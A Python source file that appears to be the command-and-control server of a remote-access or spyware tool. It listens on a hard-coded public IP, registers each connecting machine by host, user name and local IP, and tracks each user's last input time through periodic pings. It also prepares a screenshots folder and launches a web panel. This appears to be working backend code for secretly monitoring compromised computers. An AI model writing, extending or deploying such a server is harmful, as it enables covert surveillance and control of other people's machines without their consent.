import socket
import threading
import time
import os
import uuid
from concurrent.futures import ThreadPoolExecutor
from state import client_info, clients
from datetime import datetime

adr = "45.139.78.250"
port = 46512
MAX_THREADS = 100


def handle_client(conn, addr):
    client_id = None
    try:
        data = conn.recv(1024).decode()
        print(f"[RECV from {addr}] {data}")

        if not data.startswith("INFO:"):
            conn.close()
            return

        parts = data[5:].split(";")
        host, user, ip = parts[:3]

        client_id = str(uuid.uuid4())

        clients[client_id] = conn
        client_info[client_id] = {
            "public_ip": addr[0],
            "local_ip": ip,
            "user": user,
            "host": host,
            "last_active": None
        }

        last_ping = time.time()

        while True:
            if time.time() - last_ping > 30:
                print(f"[TIMEOUT] {client_id} не отвечает > 30 сек")
                break

            try:
                conn.sendall(b"PING")
                conn.settimeout(5)
                pong = conn.recv(64)

                if pong.startswith(b'PONG'):
                    pong_str = pong.decode()
                    if ':' in pong_str:
                        try:
                            timestamp = int(pong_str.split(':')[1])
                            last_input_dt = datetime.fromtimestamp(timestamp)
                            client_info[client_id]["last_active"] = last_input_dt.strftime('%Y-%m-%d %H:%M:%S')
                        except Exception:
                            pass
                    else:
                        client_info[client_id]["last_active"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                last_ping = time.time()

            except Exception as e:
                print(f"[ERROR] {client_id}: {e}")
                break

            time.sleep(10)

    finally:
        if client_id and client_id in clients:
            del clients[client_id]
        if client_id and client_id in client_info:
            del client_info[client_id]
        try:
            conn.close()
        except Exception:
            pass
        print(f"[DISCONNECT] {addr} ({client_id})")


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((adr, port))
    server.listen(5)
    print(f"[LISTENING] Server on {adr}:{port}")

    executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

    while True:
        conn, addr = server.accept()
        print(f"[CONNECT] {addr}")
        executor.submit(handle_client, conn, addr)


if not os.path.exists("static/screenshots"):
    os.makedirs("static/screenshots")
threading.Thread(target=start_server, daemon=True).start()
from web import app
app.run(host=adr, port=5000)
